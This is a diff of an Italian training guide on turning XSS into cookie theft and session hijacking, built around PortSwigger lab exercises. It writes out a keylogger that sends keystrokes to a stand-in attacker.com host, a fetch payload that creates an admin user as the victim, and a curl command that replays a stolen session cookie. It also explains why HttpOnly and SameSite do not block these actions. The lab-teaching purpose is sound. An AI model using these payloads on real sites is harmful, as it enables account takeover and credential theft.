@@ -1,15 +1,15 @@
 # Cookie Stealing & Session Hijack via XSS
 
-**Difficolta:** Advanced
+**Difficoltà:** Advanced
 **Time to Master:** 1.5h
 **Prerequisiti:** [06-WAF-Evasion.md](06-WAF-Evasion.md)
-**Lab:** PortSwigger Academy — Exploiting XSS to steal cookies
+**Lab:** PortSwigger Academy, Exploiting XSS to steal cookies
 
 ---
 
 ## Obiettivo
 
-Trasformare una XSS confermata in un impatto concreto: furto del cookie di sessione della vittima per impersonarla, o azioni per suo conto senza bisogno del cookie (keylogging, CSRF token theft).
+Un `alert(1)` che spunta convince te che il bug esiste, ma non convince un cliente che rischia qualcosa di concreto: qui trasformi una XSS confermata in un impatto vero, il furto del cookie di sessione della vittima per impersonarla, o — quando il cookie non è raggiungibile — azioni per suo conto senza bisogno del cookie (keylogging, furto di token CSRF).
 
 ---
 
@@ -17,7 +17,7 @@ Trasformare una XSS confermata in un impatto concreto: furto del cookie di sessi
 
 ### Pre-condizione: il cookie deve essere leggibile da JS
 
-Se il cookie ha il flag `HttpOnly`, `document.cookie` NON lo include: in quel caso il furto diretto non funziona, serve un approccio diverso (vedi Evasion piu sotto).
+Se il cookie ha il flag `HttpOnly`, `document.cookie` NON lo include: in quel caso il furto diretto non funziona, serve un approccio diverso (vedi Evasion più sotto).
 
 ---
 
@@ -57,17 +57,17 @@ curl "http://target.com/dashboard" -H "Cookie: session=VALORE_RUBATO"
 
 Oppure via browser: apri DevTools > Application > Cookies, incolla manualmente il valore rubato.
 
-### Esempio 4: keylogger minimale quando il cookie e HttpOnly
+### Esempio 4: keylogger minimale quando il cookie è HttpOnly
 
 ```html
 <script>
-document.onkeypress = function(e) {
+document.addEventListener('keydown', function(e) {
     fetch('http://attacker.com/log?k=' + e.key);
-}
+});
 </script>
 ```
 
-**Spiegazione:** se il cookie non e accessibile via JS, l'impatto si sposta su cattura credenziali digitate, azioni eseguite per conto della vittima (CSRF token theft), o interazione diretta col DOM per compiere azioni privilegiate.
+**Spiegazione:** se il cookie non è accessibile via JS, l'impatto si sposta su cattura credenziali digitate, azioni eseguite per conto della vittima (CSRF token theft), o interazione diretta col DOM per compiere azioni privilegiate.
 
 ### Esempio 5: eseguire un'azione privilegiata per conto della vittima invece di rubare il cookie
 
@@ -82,25 +82,25 @@ fetch('/api/admin/create_user', {
 </script>
 ```
 
-**Spiegazione:** `credentials: 'include'` fa si che la richiesta parta con i cookie di sessione della vittima gia autenticata: non serve rubare nulla, l'azione (es. creare un utente admin) avviene direttamente nel suo contesto.
+**Spiegazione:** `credentials: 'include'` fa sì che la richiesta parta con i cookie di sessione della vittima già autenticata: non serve rubare nulla, l'azione (es. creare un utente admin) avviene direttamente nel suo contesto.
 
 ---
 
 ## Evasion / Bypass Techniques
 
-### Bypass HttpOnly (non possibile via JS — serve altro layer)
+### Bypass HttpOnly (non possibile via JS, serve altro layer)
 
-`HttpOnly` blocca solo la lettura via `document.cookie`; il payload puo comunque compiere azioni privilegiate per conto della vittima (vedi Esempio 5) sfruttando il fatto che il browser invia comunque il cookie nelle richieste, semplicemente JS non puo leggerlo.
+`HttpOnly` blocca solo la lettura via `document.cookie`; il payload può comunque compiere azioni privilegiate per conto della vittima (vedi Esempio 5) sfruttando il fatto che il browser invia comunque il cookie nelle richieste, semplicemente JS non può leggerlo.
 
 ### Bypass SameSite=Strict (limita CSRF-style ma non XSS diretta)
 
-Un payload XSS eseguito nello stesso contesto/dominio della vittima non e soggetto alle restrizioni SameSite (che riguardano richieste cross-site): la sessione resta pienamente sfruttabile.
+Un payload XSS eseguito nello stesso contesto/dominio della vittima non è soggetto alle restrizioni SameSite (che riguardano richieste cross-site): la sessione resta pienamente sfruttabile.
 
 ---
 
 ## Lab Hands-On
 
-### Lab 1: PortSwigger — Exploiting XSS to steal cookies
+### Lab 1: PortSwigger, Exploiting XSS to steal cookies
 **Obiettivo:** rubare il cookie di sessione admin tramite commento stored XSS
 **Difficulty:** Difficile
 **Time:** 45 min
@@ -114,14 +114,14 @@ Un payload XSS eseguito nello stesso contesto/dominio della vittima non e sogget
 
 ## Common Mistakes
 
-- Dare per scontato che HttpOnly renda l'XSS "innocua" -> l'impatto si sposta, non sparisce (vedi Esempio 5)
+- Dare per scontato che HttpOnly renda l'XSS "innocua" -> l'impatto si sposta, non sparisce affatto (vedi Esempio 5)
 - Dimenticare `credentials: 'include'` nelle fetch quando serve sfruttare la sessione della vittima per azioni dirette
 
 ---
 
 ## Link Utili
 
-- [PortSwigger — Exploiting XSS to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting)
+- [PortSwigger: Exploiting XSS to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting)
 - [webhook.site](https://webhook.site/)
 
 ---
@@ -137,12 +137,7 @@ Un payload XSS eseguito nello stesso contesto/dominio della vittima non e sogget
 ## Checklist di padronanza
 
 - [ ] So esfiltrare un cookie non-HttpOnly
-- [ ] So agire per conto della vittima quando il cookie e HttpOnly
+- [ ] So agire per conto della vittima quando il cookie è HttpOnly
 - [ ] So usare un endpoint esterno per ricevere dati esfiltrati
 - [ ] Capisco la differenza pratica tra HttpOnly e SameSite
 
----
-
-## Note personali
-
-_(spazio libero)_
